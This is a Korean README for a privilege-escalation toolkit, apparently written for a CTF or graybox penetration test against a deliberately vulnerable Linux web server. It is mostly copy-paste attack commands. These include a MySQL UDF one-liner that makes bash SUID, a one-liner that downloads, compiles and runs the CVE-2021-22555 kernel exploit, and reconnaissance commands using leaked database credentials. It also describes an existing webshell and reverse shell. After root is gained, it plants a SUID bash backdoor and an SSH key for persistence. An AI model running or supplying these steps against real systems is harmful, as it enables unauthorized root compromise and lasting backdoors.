# 권한 상승 가이드 - 여기서 시작

## 📁 문서 구조

이 디렉토리에는 다음 가이드들이 있습니다:

### 🚀 즉시 실행 (가장 중요!)

1. **QUICK_COMMANDS.txt** ← 여기서 시작!
   - 타겟에서 바로 복사해서 붙여넣을 수 있는 명령어들
   - 우선순위별로 정리됨
   - 가장 빠르게 시작하려면 이것부터

2. **EXECUTE_NOW.sh**
   - 모든 권한 상승 방법을 자동으로 시도하는 스크립트
   - 타겟에 업로드해서 실행
   - 결과를 자동으로 체크

### 📚 상세 가이드

3. **MYSQL_UDF_DETAILED.md**
   - MySQL UDF 권한 상승 완전 가이드
   - 단계별 상세 설명
   - 트러블슈팅 포함
   - 가장 유망한 방법!

4. **MYSQL_UDF_NOW.md**
   - MySQL UDF 즉시 실행 버전
   - C2 서버 사용 방법 포함
   - Base64 전송 방법

5. **CVE_2021_22555_GUIDE.md**
   - CVE-2021-22555 커널 exploit 가이드
   - LinPEAS가 추천한 exploit
   - 컴파일 및 실행 방법

6. **ALTERNATIVE_PRIVESC.md**
   - 파일 전송 없이 가능한 방법들
   - Python, Splunk, Cron Jobs 등
   - 여러 대안 제시

### 🛠️ 기술 문서

7. **NO_NC_SOLUTION.md**
   - netcat 없을 때 파일 전송 방법
   - /dev/tcp, base64, Python socket 등

8. **C2_SERVER_SETUP.md**
   - C2 서버 연결 문제 해결
   - HTTP 서버, 방화벽, 보안그룹 설정

### 🎯 전략 가이드

9. **CRITICAL_HINTS.md** ← 막혔을 때 읽기!
   - "하나만 알면 다 풀리는" 정보들
   - 그레이박스에서 요청할 힌트들
   - 우선순위별 정리

10. **PRIVILEGE_ESCALATION_GUIDE.md**
    - 8가지 권한 상승 방법
    - 각 방법의 전제조건
    - 일반적인 가이드

11. **STUCK_PRIV_ESC_CHECKLIST.md**
    - 막혔을 때 체크리스트
    - Amazon Linux 2023 특화
    - 빠진 부분 확인용

---

## 🎯 빠른 시작 (3단계)

### 1단계: MySQL 확인 (30초)

타겟 리버스 쉘에서:

```bash
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@plugin_dir; SELECT @@secure_file_priv; SELECT VERSION();"
```

**결과 확인:**
- `@@secure_file_priv`가 `NULL` → MySQL UDF 가능! (2단계로)
- `@@secure_file_priv`가 경로 → 제한있음 (3단계로)

---

### 2단계: MySQL UDF 시도 (5분)

**QUICK_COMMANDS.txt**의 "2단계: MySQL UDF 권한 상승" 섹션 복사 후 실행

또는 자세한 가이드는 **MYSQL_UDF_DETAILED.md** 참고

---

### 3단계: 다른 방법들 (10-30분)

**EXECUTE_NOW.sh** 실행:

```bash
cd /tmp
# 로컬에서 타겟으로 전송 (방법은 NO_NC_SOLUTION.md 참고)
chmod +x EXECUTE_NOW.sh
bash EXECUTE_NOW.sh 2>&1 | tee priv_esc_results.txt
```

또는 **QUICK_COMMANDS.txt**의 다른 단계들 순서대로 시도

---

## 📊 현재 상황 요약

### ✅ 확보한 것들:
- Apache 사용자 리버스 쉘
- MySQL 접근 (webuser/WebPassw0rd!)
- 웹쉘 (file.php?cmd=)
- gcc 컴파일러
- wget (외부 인터넷 접근)

### ❌ 시도했지만 실패:
- CVE-2021-22555 (Netfilter)
- CVE-2022-0847 (Dirty Pipe)
- CVE-2021-3493 (OverlayFS)
- CVE-2021-4034 (PwnKit)
- sudo token hijacking

### ❓ 아직 확인 안된 것들:
- MySQL root 비밀번호
- 시스템 사용자 비밀번호 (hongjungho, hongjungsu)
- Writable cron jobs
- Splunk root 실행 여부
- 비표준 SUID 바이너리
- phpMyAdmin 활용

---

## 🎯 권장 순서

### 우선순위 1: MySQL UDF ⭐⭐⭐⭐⭐
1. **QUICK_COMMANDS.txt** 2단계 실행
2. 실패시 **MYSQL_UDF_DETAILED.md** 트러블슈팅 확인
3. 여전히 실패시 **CRITICAL_HINTS.md** 참고

### 우선순위 2: CVE-2021-22555 ⭐⭐⭐⭐
1. **QUICK_COMMANDS.txt** 3단계 실행
2. 자세한 내용은 **CVE_2021_22555_GUIDE.md**

### 우선순위 3: 대안 방법들 ⭐⭐⭐
1. **ALTERNATIVE_PRIVESC.md** 참고
2. Cron jobs, Splunk, 프로세스 메모리 등

### 마지막: 힌트 요청 ⭐
1. **CRITICAL_HINTS.md** 읽기
2. 그레이박스 힌트 요청
3. 힌트로 권한 상승

---

## 💡 자주 묻는 질문

### Q1: 어디서부터 시작해야 하나?
**A:** `QUICK_COMMANDS.txt` 파일을 열고 1단계부터 순서대로 실행

### Q2: MySQL UDF가 왜 가장 유망한가?
**A:**
- 이미 MySQL 접근 가능
- webuser가 File_priv 있을 가능성
- @@secure_file_priv가 NULL이면 거의 확실
- 성공시 즉시 root 권한

### Q3: 컴파일 에러가 나면?
**A:**
```bash
export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH"
```

### Q4: 파일을 타겟으로 어떻게 전송하나?
**A:** `NO_NC_SOLUTION.md` 참고
- /dev/tcp (가장 빠름)
- base64 인코딩
- Python socket
- curl + HTTP 서버

### Q5: 모든 방법이 실패하면?
**A:** `CRITICAL_HINTS.md` 참고
- MySQL root 비밀번호가 핵심
- 시스템 사용자 비밀번호
- 그 외 결정적 정보들

### Q6: 자동화할 수 있나?
**A:** 네, `EXECUTE_NOW.sh` 실행

---

## 🔥 핵심 명령어 모음

### MySQL 빠른 체크
```bash
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;"
```

### MySQL UDF 원라이너 (컴파일만 되어 있으면)
```bash
cd /tmp && mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "CREATE TABLE udf(line blob); INSERT INTO udf VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));" && mysql -u webuser -p'WebPassw0rd!' mysql -e "SELECT * FROM vulnerable_sns.udf INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so'; CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'; SELECT do_system('chmod u+s /bin/bash');" && /bin/bash -p
```

### CVE-2021-22555 원라이너
```bash
cd /tmp && wget -q https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve.c && gcc -o cve cve.c -static 2>/dev/null && ./cve && whoami
```

### 전체 체크 (빠른 정찰)
```bash
echo "=== MySQL ===" && mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;" && echo "=== Splunk ===" && ps aux | grep splunk | grep root && echo "=== Cron ===" && find /etc/cron* -writable 2>/dev/null && echo "=== Python ===" && which python3
```

---

## 📞 도움이 필요하면

1. **막혔을 때:** `CRITICAL_HINTS.md` 읽기
2. **MySQL 문제:** `MYSQL_UDF_DETAILED.md` 트러블슈팅
3. **파일 전송 문제:** `NO_NC_SOLUTION.md`
4. **전반적 이해:** `PRIVILEGE_ESCALATION_GUIDE.md`

---

## 🎉 성공했을 때

Root 쉘을 얻으면:

```bash
# 확인
whoami
id

# 플래그
find / -name "*flag*" -type f 2>/dev/null
cat /root/flag.txt

# 백도어
cp /bin/bash /tmp/.backdoor
chmod u+s /tmp/.backdoor

# SSH 키
mkdir -p /root/.ssh
echo "ssh-rsa [공개키]" >> /root/.ssh/authorized_keys

# AWS
aws sts get-caller-identity
aws ec2 describe-instances
```

---

## 📝 다음 단계

1. ✅ 이 README 읽음
2. ⬜ `QUICK_COMMANDS.txt` 열기
3. ⬜ MySQL 확인 (1단계)
4. ⬜ MySQL UDF 시도 (2단계)
5. ⬜ 대안 방법들 시도
6. ⬜ 필요시 힌트 요청 (`CRITICAL_HINTS.md`)
7. ⬜ Root 획득!

---

**행운을 빕니다! 🚀**

문서가 도움이 되면 각 섹션을 따라가면서 체크리스트를 완성하세요.
